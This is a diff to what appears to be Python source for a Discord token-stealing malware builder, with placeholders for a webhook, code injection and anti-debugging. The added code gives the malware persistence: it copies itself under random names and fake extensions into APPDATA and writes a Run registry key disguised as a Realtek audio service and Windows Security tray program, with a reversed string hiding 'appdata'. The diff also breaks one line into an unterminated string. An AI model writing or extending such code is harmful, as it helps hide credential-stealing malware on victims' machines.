@@ -26,7 +26,7 @@ webhook = '%Webhook%'
 FakeWebhook = '%FakeWebhook%'
 Fakegen = '%FakeGen%' 
 injection = '%Injection%' 
-Startup = '%Startup%' 
+Startup = '%Startup%
 antidebugging = '%No_Debug%' 
 DiscordStop = '%Close%' 
 
@@ -284,23 +284,63 @@ def Clipboard():
     except subprocess.CalledProcessError as e:
         return 'Error while getting clipboard'
 
-
+import string
 apppp = 'atadppa'
 path = f"{os.getenv(f'{apppp[::-1]}')}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Realtek.pyw"
+
+def get_random_path():
+    possible_paths = [os.getenv("APPDATA"), os.getenv("LOCALAPPDATA")]
+    chosen_path = random.choice(possible_paths)
+    return chosen_path
+
+def generate_random_filename():
+    random_chars = ''.join(random.choice(string.ascii_lowercase) for _ in range(8))
+    file_extensions = ['.dll', '.png', '.jpg', '.ink', '.url', '.jar', '.tmp', '.db', '.cfg', '.jpeg']
+    return random_chars + random.choice(file_extensions)
+
+def create_copy_and_return_new_path():
+    current_script_path = sys.argv[0]
+    
+    new_filename = generate_random_filename()
+    new_path = os.path.join(get_random_path(), new_filename)
+    
+    shutil.copy2(current_script_path, new_path)
+    
+    return new_path
+
+def add_to_startup(new_path):
+    faked = 'SecurityHealthSystray.exe'
+    address = f"{sys.executable} {new_path}"
+    key1 = winreg.HKEY_CURRENT_USER
+    key2 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
+    
+    open_ = winreg.CreateKeyEx(key1, key2, 0, winreg.KEY_WRITE)
+    winreg.SetValueEx(open_, "Realtek HD Audio Universal Service", 0, winreg.REG_SZ, f"{faked} & {address}")
+
+
 
 def startup():
     global StartupMessage
     StartupMessage = 'Sucessfully added to startup'
+    try:
+
+        new_path = create_copy_and_return_new_path()
+    
+        try:
+            add_to_startup(new_path)
+        except Exception as e:
+            pass
+    except:pass
+    apppp = 'atadppa'
+    path = f"{os.getenv(f'{apppp[::-1]}')}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Realtek.pyw"
+
     if not isfile(path):
         copy(__file__, path)
-        with open(path, 'r+b') as f:
-            content = f.read()
-            f.seek(0)
-            f.write(content.replace(b"fakeerror = True", b"fakeerror = False"))
-            f.truncate()
+
     else:
         if __file__.replace('\\', '/') != path.replace('\\', '/'):
             pass
+
 
 
 def LoadUrlib(hook, data='', files='', headers=''):
